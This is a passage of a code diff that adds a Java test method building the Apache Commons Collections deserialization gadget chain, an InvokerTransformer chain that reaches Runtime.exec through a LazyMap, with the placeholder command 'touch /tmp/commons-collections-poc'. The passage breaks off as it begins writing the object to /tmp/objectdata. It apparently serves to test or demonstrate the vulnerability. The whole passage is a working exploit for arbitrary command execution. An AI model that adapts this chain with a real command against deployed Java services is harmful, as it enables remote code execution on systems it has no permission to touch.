@@ -1,0 +1,20 @@
+public void testInvokerTransformer() {
+    String cmd = "touch /tmp/commons-collections-poc";
+    Transformer[] transformers = new Transformer[] {
+        new ConstantTransformer(Runtime.class),
+        new InvokerTransformer("getMethod", new Class[] {
+            String.class, Class[].class }, new Object[] {
+            "getRuntime", new Class[0] }),
+        new InvokerTransformer("invoke", new Class[] {
+            Object.class, Object[].class }, new Object[] {
+            null, new Object[0] }),
+        new InvokerTransformer("exec", new Class[] {
+            String.class }, new Object[] { cmd }),
+        new ConstantTransformer(1) };
+    Transformer transformer = new ChainedTransformer(transformers);
+    Map map = new HashMap();
+    map.put("foo", "bar");
+    Map lazyMap = LazyMap.decorate(map, transformer);
+    try {
+        FileOutputStream fos = new FileOutputStream("/tmp/objectdata");
+        ObjectOutputStream oos = new ObjectOutput
